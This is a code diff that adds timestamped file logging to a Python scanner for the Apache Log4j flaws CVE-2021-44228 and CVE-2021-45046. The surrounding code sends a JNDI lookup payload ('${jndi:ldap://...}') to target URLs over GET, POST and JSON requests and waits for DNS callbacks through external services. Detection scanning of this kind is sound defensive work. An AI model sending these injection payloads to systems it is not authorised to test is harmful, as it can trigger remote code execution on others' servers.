@@ -12,6 +12,7 @@ import argparse
 import random
 import requests
 import time
+import logging
 import sys
 from urllib import parse as urlparse
 import base64
@@ -22,6 +23,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+from datetime import datetime
 
 
 # Disable SSL warnings
@@ -31,6 +33,10 @@ try:
 except Exception:
     pass
 
+now = datetime.now()
+dt_string = now.strftime('%Y%m%dT%H%M')
+logfile='mount/log4jscan-'+dt_string+'.log'
+logging.basicConfig(filename=logfile, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y/%m/%dT%H:%M:%S', level=logging.INFO)
 
 cprint('[-] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
 
@@ -196,6 +202,7 @@ def get_cve_2021_45046_payloads(callback_host, random_string):
 
 
 class Dnslog(object):
+    logging.info(f"Setting up dnslog DNS callback provider")
     def __init__(self):
         self.s = requests.session()
         req = self.s.get("http://www.dnslog.cn/getdomain.php",
@@ -212,6 +219,7 @@ class Dnslog(object):
 
 class Interactsh:
     # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
+    logging.info(f"Setting up interactsh DNS callback provider.")
     def __init__(self, token="", server=""):
         rsa = RSA.generate(2048)
         self.public_key = rsa.publickey().exportKey()
@@ -301,6 +309,7 @@ def parse_url(url):
 
 
 def scan_url(url, callback_host):
+    logging.info(f"Starting scan.")
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
@@ -313,7 +322,9 @@ def scan_url(url, callback_host):
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
 
     for payload in payloads:
+        logging.info(f"URL: {url} - PAYLOAD: {payload}.")
         cprint(f"[+] URL: {url} | PAYLOAD: {payload}", "cyan")
+        
 
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
@@ -327,6 +338,7 @@ def scan_url(url, callback_host):
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
+                logging.error(f"{e}")
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
@@ -342,6 +354,7 @@ def scan_url(url, callback_host):
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
+                logging.error(f"{e}")
 
             try:
                 # JSON body
@@ -356,9 +369,11 @@ def scan_url(url, callback_host):
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
+                logging.error(f"{e}")
 
 
 def main():
+    logging.info(f"Executing the script with the following arguments: {sys.argv[1:]}")
     urls = []
     if args.url:
         urls.append(args.url)
@@ -394,12 +409,15 @@ def main():
         return
 
     cprint("[-] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
+    logging.info(f"Scan completed. Waiting for DNS repsonse.")
     cprint("[-] Waiting...", "cyan")
     time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
+        logging.info(f"No vulnerable targets found.")
         cprint("[+] Targets do not seem to be vulnerable.", "green")
     else:
+        logging.critical(f"DNS return found. One or more targets vulnarable")
         cprint("[!!!] Targets Affected", "yellow")
         for i in records:
             cprint(json.dumps(i), "yellow")
